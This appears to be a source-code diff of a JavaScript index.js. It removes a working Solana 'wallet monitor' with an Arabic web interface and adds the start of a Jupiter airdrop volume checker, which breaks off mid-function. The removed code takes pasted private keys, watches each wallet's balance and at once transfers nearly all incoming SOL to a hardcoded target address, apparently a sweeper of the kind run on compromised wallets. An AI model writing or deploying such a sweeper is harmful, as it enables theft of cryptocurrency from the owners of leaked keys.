@@ -1,928 +1,388 @@
-const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
-const bs58 = require('bs58').default;
-const express = require('express');
-require('dotenv').config();
+// index.js
+import express from 'express';
+import { createServer } from 'http';
+import { Server } from 'socket.io';
+import fs from 'fs';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import { setTimeout as wait } from 'timers/promises';
 
-class SolanaWebMonitor {
-    convertToHttpUrl(url) {
-        // Convert WebSocket URLs to HTTP URLs for Connection
-        if (url.startsWith('wss://')) {
-            return url.replace('wss://', 'https://');
-        } else if (url.startsWith('ws://')) {
-            return url.replace('ws://', 'http://');
-        }
-        // Return as-is if already HTTP/HTTPS
-        return url;
-    }
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-    constructor() {
-        // Initialize web monitoring system
-        this.logs = [];
-        
-        // Target address to forward funds to
-        this.targetAddress = new PublicKey('XX4k8NidriAUsGKTjAvYHonxcKJj99R859vMAAGSLQ9');
-        
-        // Store wallets and their corresponding RPC connections
-        this.wallets = [];
-        this.connections = [];
-        this.subscriptionIds = [];
-        this.lastBalances = [];
-        
-        // Available RPC URLs
-        this.rpcUrls = [
-            process.env.RPC_URL,
-            process.env.RPC_URL2,
-            process.env.RPC_URL3,
-            process.env.RPC_URL4,
-            process.env.RPC_URL5
-        ].filter(url => url) // Remove undefined URLs
-         .map(url => this.convertToHttpUrl(url)); // Convert WebSocket URLs to HTTP
-        
-        // Store notifications for web interface
-        this.notifications = [];
-        
-        // Track RPC errors
-        this.rpcErrorCounts = new Array(this.rpcUrls.length).fill(0);
-        this.lastRpcErrorTime = new Array(this.rpcUrls.length).fill(0);
-        this.rpcFailedWallets = new Set(); // Track wallets with failed RPCs
-        
-        console.log('🌐 Solana Web Monitor initialized');
-        console.log(`🔗 Available RPC URLs: ${this.rpcUrls.length}`);
-    }
-    
-    addLog(message, type = 'info') {
-        const log = {
-            id: Date.now(),
-            message,
-            type,
-            timestamp: new Date().toISOString()
-        };
-        this.logs.unshift(log);
-        
-        // Keep only last 100 logs
-        if (this.logs.length > 100) {
-            this.logs = this.logs.slice(0, 100);
-        }
-        
-        console.log(`[${type.toUpperCase()}] ${message}`);
-    }
-    
-    addNotification(message, type = 'info') {
-        const notification = {
-            id: Date.now(),
-            message,
-            type,
-            timestamp: new Date().toISOString()
-        };
-        this.notifications.unshift(notification);
-        
-        // Keep only last 50 notifications
-        if (this.notifications.length > 50) {
-            this.notifications = this.notifications.slice(0, 50);
-        }
-        
-        this.addLog(message, type);
-    }
-    
-    processPrivateKeys(keysText) {
-        const privateKeys = keysText.split('\n').filter(key => key.trim());
-        
-        if (privateKeys.length === 0) {
-            this.addNotification('❌ لم يتم العثور على مفاتيح صالحة', 'error');
-            return { success: false, message: 'لم يتم العثور على مفاتيح صالحة' };
-        }
-        
-        if (privateKeys.length > this.rpcUrls.length) {
-            this.addNotification(`⚠️ يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط (عدد RPC URLs المتاحة)`, 'warning');
-            return { success: false, message: `يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط` };
-        }
-        
-        // Stop current monitoring
-        this.stopAllMonitoring();
-        
-        // Initialize wallets and connections
-        this.wallets = [];
-        this.connections = [];
-        
-        let successCount = 0;
-        
-        for (let i = 0; i < privateKeys.length; i++) {
-            try {
-                const privateKey = privateKeys[i].trim();
-                const privateKeyBytes = bs58.decode(privateKey);
-                const wallet = Keypair.fromSecretKey(privateKeyBytes);
-                const connection = new Connection(this.rpcUrls[i], 'confirmed');
-                
-                this.wallets.push(wallet);
-                this.connections.push(connection);
-                successCount++;
-                
-                console.log(`✅ Wallet ${i + 1} loaded: ${wallet.publicKey.toString()}`);
-                console.log(`🔗 Using RPC: ${this.rpcUrls[i]}`);
-                
-            } catch (error) {
-                this.addNotification(`❌ خطأ في المفتاح ${i + 1}: ${error.message}`, 'error');
-                continue;
-            }
-        }
-        
-        if (successCount > 0) {
-            this.addNotification(`✅ تم تحميل ${successCount} محفظة بنجاح!`, 'success');
-            this.startMonitoring();
-            return { success: true, message: `تم تحميل ${successCount} محفظة بنجاح` };
-        } else {
-            this.addNotification('❌ فشل في تحميل أي محفظة', 'error');
-            return { success: false, message: 'فشل في تحميل أي محفظة' };
-        }
-    }
-    
-    async startMonitoring() {
-        this.addNotification('🔍 بدء مراقبة المحافظ...', 'info');
-        
-        // Store subscription IDs to track active subscriptions
-        this.subscriptionIds = [];
-        this.lastBalances = [];
-        
-        for (let i = 0; i < this.wallets.length; i++) {
-            const wallet = this.wallets[i];
-            const connection = this.connections[i];
-            const walletIndex = i + 1;
-            
-            // Check initial balance
-            try {
-                const initialBalance = await this.getBalance(connection, wallet.publicKey);
-                this.lastBalances[i] = initialBalance;
-                
-                if (initialBalance > 0) {
-                    // Send funds immediately
-                    const sendPromise = this.forwardFunds(connection, wallet, initialBalance, walletIndex);
-                    // Send notification in parallel
-                    this.addNotification(`💰 المحفظة ${walletIndex}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`, 'info');
-                    await sendPromise;
-                }
-            } catch (error) {
-                console.error(`Error checking initial balance for wallet ${walletIndex}:`, error.message);
-                this.lastBalances[i] = 0;
-            }
-            
-            // Set up WebSocket subscription for this wallet
-            try {
-                const subscriptionId = connection.onAccountChange(
-                    wallet.publicKey,
-                    async (accountInfo) => {
-                        try {
-                            const newBalance = accountInfo.lamports;
-                            const oldBalance = this.lastBalances[i] || 0;
-                            
-                            if (newBalance > oldBalance && newBalance > 0) {
-                                const received = newBalance - oldBalance;
-                                console.log(`💰 Wallet ${walletIndex}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
-                                
-                                // Send funds immediately
-                                const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletIndex);
-                                // Send notification in parallel (non-blocking)
-                                this.addNotification(`💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
-                                await sendPromise;
-                            }
-                            
-                            this.lastBalances[i] = newBalance;
-                            
-                        } catch (error) {
-                            console.error(`Error processing account change for wallet ${walletIndex}:`, error.message);
-                            this.handleRpcError(error, i, walletIndex);
-                        }
-                    },
-                    'confirmed'
-                );
-                
-                this.subscriptionIds.push(subscriptionId);
-                console.log(`✅ WebSocket subscription started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);
-                
-            } catch (error) {
-                console.error(`Error setting up subscription for wallet ${walletIndex}:`, error.message);
-                this.handleRpcError(error, i, walletIndex);
-                this.subscriptionIds.push(null);
-            }
-        }
-        
-        this.addNotification(`✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر WebSocket`, 'success');
-    }
-    
-    async getBalance(connection, publicKey) {
-        const balance = await connection.getBalance(publicKey);
-        return balance;
-    }
-    
-    async forwardFunds(connection, wallet, amount, walletIndex) {
-        try {
-            const startTime = Date.now();
-            
-            const { blockhash } = await connection.getLatestBlockhash('confirmed');
-            const transactionFee = 5000;
-            const amountToSend = amount - transactionFee;
-            
-            if (amountToSend <= 0) {
-                this.addNotification(`⚠️ المحفظة ${walletIndex}: المبلغ قليل جداً بعد خصم الرسوم`, 'warning');
-                return false;
-            }
-            
-            const transaction = new Transaction({
-                recentBlockhash: blockhash,
-                feePayer: wallet.publicKey
-            });
-            
-            const transferInstruction = SystemProgram.transfer({
-                fromPubkey: wallet.publicKey,
-                toPubkey: this.targetAddress,
-                lamports: amountToSend
-            });
-            
-            transaction.add(transferInstruction);
-            transaction.sign(wallet);
-            
-            const signature = await connection.sendRawTransaction(
-                transaction.serialize(),
-                {
-                    skipPreflight: false,
-                    maxRetries: 3
-                }
-            );
-            
-            const executionTime = Date.now() - startTime;
-            
-            const successMessage = `✅ المحفظة ${walletIndex}: تم إرسال ${amountToSend / LAMPORTS_PER_SOL} SOL
-📝 المعاملة: https://solscan.io/tx/${signature}
-⚡ وقت التنفيذ: ${executionTime}ms`;
-            
-            this.addNotification(successMessage, 'success');
-            return true;
-            
-        } catch (error) {
-            this.addNotification(`❌ المحفظة ${walletIndex}: خطأ في التحويل - ${error.message}`, 'error');
-            return false;
-        }
-    }
-    
-    async getStatus() {
-        if (this.wallets.length === 0) {
-            return { message: '📊 لا توجد محافظ قيد المراقبة', wallets: [] };
-        }
-        
-        let statusMessage = `📊 حالة المحافظ:\n\n`;
-        
-        for (let i = 0; i < this.wallets.length; i++) {
-            const wallet = this.wallets[i];
-            const connection = this.connections[i];
-            const rpcUrl = this.rpcUrls[i];
-            
-            const walletNumber = i + 1;
-            const errorCount = this.rpcErrorCounts[i];
-            const isFailed = this.rpcFailedWallets.has(walletNumber);
-            
-            // Test RPC connection
-            let rpcStatus = '🟢 متصل';
-            let currentBalance = 'غير معروف';
-            
-            try {
-                const balance = await this.getBalance(connection, wallet.publicKey);
-                currentBalance = `${balance / LAMPORTS_PER_SOL} SOL`;
-                rpcStatus = '🟢 متصل';
-            } catch (error) {
-                rpcStatus = '🔴 خطأ في الاتصال';
-            }
-            
-            // Check subscription status
-            const hasSubscription = this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined;
-            const subscriptionStatus = hasSubscription && !isFailed ? '🟢 نشط' : '🔴 متوقف';
-            
-            statusMessage += `🔹 المحفظة ${walletNumber}:\n`;
-            statusMessage += `   العنوان: ${wallet.publicKey.toString()}\n`;
-            statusMessage += `   RPC: ${rpcUrl}\n`;
-            statusMessage += `   حالة RPC: ${rpcStatus}\n`;
-            statusMessage += `   المراقبة: ${subscriptionStatus}\n`;
-            statusMessage += `   الرصيد الحالي: ${currentBalance}\n`;
-            if (errorCount > 0) {
-                statusMessage += `   أخطاء RPC: ${errorCount}\n`;
-            }
-            if (isFailed) {
-                statusMessage += `   ⚠️ تم إيقاف هذه المحفظة نهائياً\n`;
-            }
-            statusMessage += '\n';
-        }
-        
-        statusMessage += `🎯 عنوان الهدف: ${this.targetAddress.toString()}`;
-        
-        return { 
-            message: statusMessage,
-            wallets: this.wallets.map((wallet, i) => ({
-                index: i + 1,
-                address: wallet.publicKey.toString(),
-                rpcUrl: this.rpcUrls[i],
-                errorCount: this.rpcErrorCounts[i],
-                isFailed: this.rpcFailedWallets.has(i + 1),
-                hasSubscription: this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined
-            }))
-        };
-    }
-    
-    handleRpcError(error, rpcIndex, walletIndex) {
-        const currentTime = Date.now();
-        this.rpcErrorCounts[rpcIndex]++;
-        
-        const MAX_ERRORS = 5; // Maximum errors before stopping monitoring
-        const ERROR_WINDOW = 60000; // 1 minute window
-        
-        // Check if this RPC has failed too many times
-        if (this.rpcErrorCounts[rpcIndex] >= MAX_ERRORS) {
-            // Stop monitoring for this specific wallet
-            if (this.subscriptionIds[rpcIndex] && this.connections[rpcIndex]) {
-                try {
-                    this.connections[rpcIndex].removeAccountChangeListener(this.subscriptionIds[rpcIndex]);
-                    this.subscriptionIds[rpcIndex] = null;
-                } catch (error) {
-                    console.error(`Error removing subscription for wallet ${walletIndex}:`, error.message);
-                }
-            }
-            
-            // Mark this wallet as failed and send one final notification
-            if (!this.rpcFailedWallets.has(walletIndex)) {
-                this.rpcFailedWallets.add(walletIndex);
-                
-                const stopMessage = `🛑 تم إيقاف مراقبة المحفظة ${walletIndex} نهائياً!
-
-❌ سبب الإيقاف: تعطل RPC بشكل متكرر
-🔗 RPC المتعطل: ${this.rpcUrls[rpcIndex]}
-📊 عدد الأخطاء: ${this.rpcErrorCounts[rpcIndex]}
-
-💡 لإعادة التشغيل: استخدم /add_wallets مع RPC جديد
-⚠️ لن تصلك المزيد من الرسائل لهذه المحفظة`;
-                
-                this.addNotification(stopMessage, 'error');
-            }
-        } else {
-            // Only send error notification for first few errors, not every error
-            if (this.rpcErrorCounts[rpcIndex] <= 2 && 
-                currentTime - this.lastRpcErrorTime[rpcIndex] > ERROR_WINDOW) {
-                
-                this.lastRpcErrorTime[rpcIndex] = currentTime;
-                
-                const warningMessage = `⚠️ تحذير: مشاكل في RPC للمحفظة ${walletIndex}
-🔗 RPC: ${this.rpcUrls[rpcIndex]}
-❌ الخطأ: ${error.message}
-📊 محاولة: ${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}
-
-💡 سيتم إيقاف المراقبة إذا استمرت المشاكل`;
-                
-                this.addNotification(warningMessage, 'warning');
-            }
-        }
-        
-        // Log error for debugging
-        console.error(`RPC Error - Wallet ${walletIndex} (${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}):`, error.message);
-    }
-
-    stopAllMonitoring() {
-        // Remove WebSocket subscriptions
-        for (let i = 0; i < this.subscriptionIds.length; i++) {
-            if (this.subscriptionIds[i] && this.connections[i]) {
-                try {
-                    this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]);
-                    console.log(`🔌 WebSocket subscription ${i + 1} removed`);
-                } catch (error) {
-                    console.error(`Error removing subscription ${i + 1}:`, error.message);
-                }
-            }
-        }
-        
-        this.subscriptionIds = [];
-        this.lastBalances = [];
-        
-        // Reset error tracking
-        this.rpcErrorCounts.fill(0);
-        this.lastRpcErrorTime.fill(0);
-        this.rpcFailedWallets.clear();
-        // Clear notifications on stop
-        this.addNotification('🛑 تم إيقاف مراقبة جميع المحافظ', 'info');
-        
-        console.log('🛑 All WebSocket monitoring stopped');
-    }
-}
-
-// Initialize the monitor
-const monitor = new SolanaWebMonitor();
-
-async function main() {
-    console.log('🌐 Starting Solana Web Monitor...');
-    console.log('=====================================');
-    console.log('✅ Monitor is ready for web interface...');
-}
-
-// Handle uncaught exceptions
-process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception:', error.message);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
-});
-
-// Start the application
-main().catch(error => {
-    console.error('❌ Fatal error:', error.message);
-    process.exit(1);
-});
-
-// Express server with HTML interface
 const app = express();
-const PORT = process.env.PORT || 5000;
+const httpServer = createServer(app);
+const io = new Server(httpServer);
 
-// Middleware
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use((req, res, next) => {
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.setHeader('Pragma', 'no-cache');
-    res.setHeader('Expires', '0');
-    next();
-});
+const JUP_API_KEY = process.env.JUP_API_KEY;
+const JUP_ULTRA_BASE = "https://api.jup.ag/ultra/v1";
+const HELIUS_KEYS = [
+    process.env.RPC_URL,
+    process.env.RPC_URL2,
+    process.env.RPC_URL3
+].filter(Boolean);
 
-// Main HTML interface
-app.get('/', (req, res) => {
-    const html = `<!DOCTYPE html>
-<html dir="rtl" lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مراقب محافظ Solana</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-        
-        .header {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-        }
-        
-        .main-content {
-            display: grid;
-            grid-template-columns: 1fr 400px;
-            gap: 30px;
-            padding: 30px;
-        }
-        
-        .left-panel {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .card {
-            background: #f8f9fa;
-            border: 2px solid #e9ecef;
-            border-radius: 15px;
-            padding: 25px;
-            transition: all 0.3s ease;
-        }
-        
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-        }
-        
-        .card h2 {
-            color: #495057;
-            margin-bottom: 15px;
-            font-size: 1.5rem;
-        }
-        
-        .form-group {
-            margin-bottom: 15px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #495057;
-        }
-        
-        textarea {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #dee2e6;
-            border-radius: 10px;
-            font-size: 14px;
-            resize: vertical;
-            min-height: 120px;
-            font-family: monospace;
-            direction: ltr;
-            text-align: left;
-        }
-        
-        textarea:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-        
-        .btn {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
-        }
-        
-        .btn.secondary {
-            background: linear-gradient(45deg, #6c757d, #495057);
-        }
-        
-        .btn.danger {
-            background: linear-gradient(45deg, #dc3545, #c82333);
-        }
-        
-        .right-panel {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .status-display {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 20px;
-            font-family: monospace;
-            font-size: 14px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            overflow-wrap: break-word;
-            max-height: 300px;
-            overflow-y: auto;
-            overflow-x: hidden;
-            border: 2px solid #e9ecef;
-        }
-        
-        .notifications {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 20px;
-            max-height: 400px;
-            overflow-y: auto;
-            overflow-x: hidden;
-            border: 2px solid #e9ecef;
-            word-break: break-all;
-            overflow-wrap: break-word;
-        }
-        
-        .notification {
-            padding: 10px;
-            margin-bottom: 10px;
-            border-radius: 8px;
-            font-size: 14px;
-            border-left: 4px solid #667eea;
-        }
-        
-        .notification.success {
-            background: #d4edda;
-            border-color: #28a745;
-        }
-        
-        .notification.error {
-            background: #f8d7da;
-            border-color: #dc3545;
-        }
-        
-        .notification.warning {
-            background: #fff3cd;
-            border-color: #ffc107;
-        }
-        
-        .notification.info {
-            background: #d1ecf1;
-            border-color: #17a2b8;
-        }
-        
-        .timestamp {
-            font-size: 12px;
-            color: #6c757d;
-            margin-top: 5px;
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .stat-card {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            border: 2px solid #e9ecef;
-        }
-        
-        .stat-value {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #667eea;
-        }
-        
-        .stat-label {
-            color: #6c757d;
-            font-size: 14px;
-        }
-        
-        @media (max-width: 768px) {
-            .main-content {
-                grid-template-columns: 1fr;
-            }
-            
-            .header h1 {
-                font-size: 2rem;
-            }
-        }
-        
-        .loading {
-            opacity: 0.6;
-            pointer-events: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🔥 مراقب محافظ Solana</h1>
-            <p>مراقبة وتحويل الأموال تلقائياً من محافظ Solana</p>
-        </div>
-        
-        <div class="main-content">
-            <div class="left-panel">
-                <div class="stats" id="stats">
-                    <div class="stat-card">
-                        <div class="stat-value" id="walletCount">0</div>
-                        <div class="stat-label">المحافظ المراقبة</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="activeCount">0</div>
-                        <div class="stat-label">النشطة</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="errorCount">0</div>
-                        <div class="stat-label">الأخطاء</div>
-                    </div>
-                </div>
-                
-                <div class="card">
-                    <h2>📝 إضافة محافظ للمراقبة</h2>
-                    <form id="addWalletsForm">
-                        <div class="form-group">
-                            <label for="privateKeys">المفاتيح الخاصة (كل مفتاح في سطر منفصل):</label>
-                            <textarea id="privateKeys" placeholder="ضع المفاتيح الخاصة هنا...\nكل مفتاح في سطر منفصل\nمثال: 5J1F7GHaDxuucP2VX7rciRchxrDsNo1SyJ...\n3K8H9JDa8xTvP1WX5rciRchxrDsNo1SyJ..."></textarea>
-                        </div>
-                        <button type="submit" class="btn" id="addBtn">إضافة المحافظ</button>
-                    </form>
-                </div>
-                
-                <div class="card">
-                    <h2>📊 حالة المحافظ</h2>
-                    <button type="button" class="btn secondary" id="statusBtn">عرض الحالة</button>
-                    <div class="status-display" id="statusDisplay"></div>
-                </div>
-                
-                <div class="card">
-                    <h2>⏹️ إيقاف المراقبة</h2>
-                    <button type="button" class="btn danger" id="stopBtn">إيقاف جميع المحافظ</button>
-                </div>
-            </div>
-            
-            <div class="right-panel">
-                <div class="card">
-                    <h2>🔔 الإشعارات المباشرة</h2>
-                    <div class="notifications" id="notifications">
-                        <div class="notification info">
-                            <div>مرحباً بك في مراقب محافظ Solana!</div>
-                            <div class="timestamp">${new Date().toLocaleString('ar-EG')}</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-        let updateInterval;
-        
-        // Auto refresh disabled per user request
-        function startAutoRefresh() {
-            // updateInterval = setInterval(loadNotifications, 2000);
-            console.log('Auto refresh is disabled');
-        }
-        
-        // Load notifications
-        async function loadNotifications() {
-            try {
-                const response = await fetch('/api/notifications');
-                const notifications = await response.json();
-                displayNotifications(notifications);
-                updateStats();
-            } catch (error) {
-                console.error('Error loading notifications:', error);
-            }
-        }
-        
-        // Display notifications
-        function displayNotifications(notifications) {
-            const container = document.getElementById('notifications');
-            if (notifications.length === 0) {
-                container.innerHTML = '<div class="notification info">لا توجد إشعارات حالياً</div>';
-                return;
-            }
-            
-            container.innerHTML = notifications.map(notif => 
-                '<div class="notification ' + notif.type + '">' +
-                    '<div>' + notif.message + '</div>' +
-                    '<div class="timestamp">' + new Date(notif.timestamp).toLocaleString('ar-EG') + '</div>' +
-                '</div>'
-            ).join('');
-        }
-        
-        // Update statistics
-        async function updateStats() {
-            try {
-                const response = await fetch('/api/status');
-                const status = await response.json();
-                
-                document.getElementById('walletCount').textContent = status.wallets.length;
-                document.getElementById('activeCount').textContent = status.wallets.filter(w => w.hasSubscription && !w.isFailed).length;
-                document.getElementById('errorCount').textContent = status.wallets.reduce((sum, w) => sum + w.errorCount, 0);
-            } catch (error) {
-                console.error('Error updating stats:', error);
-            }
-        }
-        
-        // Add wallets form
-        document.getElementById('addWalletsForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('addBtn');
-            const privateKeys = document.getElementById('privateKeys').value;
-            
-            if (!privateKeys.trim()) {
-                alert('الرجاء إدخال المفاتيح الخاصة');
-                return;
-            }
-            
-            btn.textContent = 'جاري الإضافة...';
-            btn.disabled = true;
-            
-            try {
-                const response = await fetch('/api/add-wallets', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ privateKeys })
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    document.getElementById('privateKeys').value = '';
-                    alert('تم إضافة المحافظ بنجاح!');
-                } else {
-                    alert('خطأ: ' + result.message);
+const HELIUS_URLS = HELIUS_KEYS.map(key => `https://api.helius.xyz/v0/transactions/?api-key=${key}`);
+
+const ALCHEMY_KEYS = [
+    process.env.BLANC_URL,
+    process.env.BLANC_URL2,
+    process.env.BLANC_URL3
+].filter(Boolean);
+const ALCHEMY_URLS = ALCHEMY_KEYS.map(key => `https://solana-mainnet.g.alchemy.com/v2/${key}`);
+
+const sleep = ms => wait(ms);
+
+let isRunning = false;
+let activeProgress = new Map();
+let results = [];
+let nextAddressIndex = 0;
+let addresses = [];
+
+async function getJupiterBalances(address) {
+    return null;
+}
+
+async function getSignaturesFromAlchemy(address, alchemyUrl, year) {
+    const startYear = year === '2025' ? 1735689600 : 1704067200;
+    const endYear = year === '2025' ? 1767225599 : 1735689599;
+    let signatures = [];
+    let before = null;
+    try {
+        const fetchBatch = async (beforeSig) => {
+            const payload = { 
+                jsonrpc: "2.0", 
+                id: 1, 
+                method: "getSignaturesForAddress", 
+                params: [address, { limit: 1000, before: beforeSig }] 
+            };
+            const resp = await fetch(alchemyUrl, { 
+                method: "POST", 
+                headers: { "Content-Type": "application/json" }, 
+                body: JSON.stringify(payload),
+                keepalive: true
+            });
+            const data = await resp.json();
+            return data.result || [];
+        };
+
+        // Fetch first batch
+        let batch = await fetchBatch(null);
+        while (batch.length > 0) {
+            let inRange = false;
+            for (const sig of batch) {
+                if (sig.blockTime >= startYear && sig.blockTime <= endYear) {
+                    signatures.push(sig.signature);
+                    inRange = true;
+                } else if (sig.blockTime < startYear) {
+                    return signatures; // Out of range, older than start
                 }
-            } catch (error) {
-                alert('خطأ في الاتصال: ' + error.message);
-            } finally {
-                btn.textContent = 'إضافة المحافظ';
-                btn.disabled = false;
             }
-        });
-        
-        // Status button
-        document.getElementById('statusBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('statusBtn');
-            const display = document.getElementById('statusDisplay');
             
-            btn.textContent = 'جاري التحديث...';
-            btn.disabled = true;
-            
-            try {
-                const response = await fetch('/api/status');
-                const status = await response.json();
-                display.textContent = status.message;
-            } catch (error) {
-                display.textContent = 'خطأ في تحميل الحالة: ' + error.message;
-            } finally {
-                btn.textContent = 'عرض الحالة';
-                btn.disabled = false;
-            }
-        });
-        
-        // Stop monitoring button
-        document.getElementById('stopBtn').addEventListener('click', async () => {
-            if (!confirm('هل أنت متأكد من إيقاف مراقبة جميع المحافظ؟')) {
+            // If the whole batch was newer than our range, we keep going
+            // If we found some in range, we continue
+            // If we hit older, we already returned.
+            const lastSig = batch[batch.length - 1].signature;
+            batch = await fetchBatch(lastSig);
+            if (!isRunning) break;
+        }
+    } catch (err) {}
+    return signatures;
+}
+
+function calculateJupAllocation(volume) {
+    if (volume >= 10000000) return 20000;
+    if (volume >= 5000000) return 12000;
+    if (volume >= 1000000) return 5000;
+    if (volume >= 500000) return 2500;
+    if (volume >= 100000) return 1000;
+    if (volume >= 10000) return 200;
+    if (volume >= 1000) return 50;
+    if (volume >= 500) return 25;
+    return 0;
+}
+
+async function analyzeSignaturesHelius(signatures, address, apiKey, onProgress) {
+    let totalJupSwaps = 0;
+    let totalVolumeUSD = 0;
+    const jupProgramIds = ["JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4", "JUP4Fb2cqiRUcaTHdrPC8h2gNsA2ETXiPDD33WcGuJB", "DCA265Vj8a9CEuX1eb1LWRnDT7uK6q1xMipnNyatn23M", "j1o2qRpjcyUwEvwtcfhEQefh773ZgjxcVRry7LDqg5X"];
+    const usdcMint = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+    const usdtMint = "Es9vMFrzaDC6is695G2C48LswSt53n4n8zVLLt39G75";
+    const concurrency = 25;
+    const batches = [];
+    for (let i = 0; i < signatures.length; i += 100) batches.push(signatures.slice(i, i + 100));
+
+    const processBatch = async (batch, startIdx) => {
+        const url = apiKey.startsWith('http') ? apiKey : `https://api.helius.xyz/v0/transactions/?api-key=${apiKey}`;
+        try {
+            const resp = await fetch(url, { 
+                method: "POST", 
+                headers: { "Content-Type": "application/json" }, 
+                body: JSON.stringify({ transactions: batch }),
+                keepalive: true
+            });
+            if (!resp.ok) {
+                if (resp.status === 429) { return processBatch(batch, startIdx); }
                 return;
             }
-            
-            const btn = document.getElementById('stopBtn');
-            btn.textContent = 'جاري الإيقاف...';
-            btn.disabled = true;
-            
-            try {
-                const response = await fetch('/api/stop', { method: 'POST' });
-                const result = await response.json();
-                alert(result.message);
-            } catch (error) {
-                alert('خطأ في الاتصال: ' + error.message);
-            } finally {
-                btn.textContent = 'إيقاف جميع المحافظ';
-                btn.disabled = false;
+            const txs = await resp.json();
+            for (const tx of txs) {
+                const txString = JSON.stringify(tx);
+                const isJup = tx.source === "JUPITER" || jupProgramIds.some(id => txString.includes(id)) || (tx.instructions && tx.instructions.some(ix => jupProgramIds.includes(ix.programId)));
+                if (isJup) {
+                    totalJupSwaps++;
+                    if (tx.events && tx.events.swap) {
+                        const swaps = Array.isArray(tx.events.swap) ? tx.events.swap : [tx.events.swap];
+                        swaps.forEach(swap => {
+                            let foundUSD = false;
+                            const tokens = [...(swap.tokenInputs || []), ...(swap.tokenOutputs || [])];
+                            tokens.forEach(t => {
+                                if (t.mint === usdcMint || t.mint === usdtMint) {
+                                    const amount = parseFloat(t.rawAmount || t.tokenAmount || "0");
+                                    if (!isNaN(amount)) {
+                                        totalVolumeUSD += t.rawAmount ? amount / 1e6 : amount;
+                                        foundUSD = true;
+                                    }
+                                }
+                            });
+                            if (!foundUSD) {
+                                const inputAmount = swap.nativeInput ? parseFloat(swap.nativeInput.amount) : 0;
+                                const outputAmount = swap.nativeOutput ? parseFloat(swap.nativeOutput.amount) : 0;
+                                if (!isNaN(inputAmount) && inputAmount > 0) totalVolumeUSD += (inputAmount / 1e9) * 155;
+                                else if (!isNaN(outputAmount) && outputAmount > 0) totalVolumeUSD += (outputAmount / 1e9) * 155;
+                            }
+                        });
+                    } else if (tx.tokenTransfers) {
+                        tx.tokenTransfers.forEach(tt => {
+                            if (tt.mint === usdcMint || tt.mint === usdtMint) {
+                                const amount = parseFloat(tt.tokenAmount || "0");
+                                if (!isNaN(amount) && (tt.fromUserAccount === address || tt.toUserAccount === address)) totalVolumeUSD += amount;
+                            }
+                        });
+                    }
+                }
             }
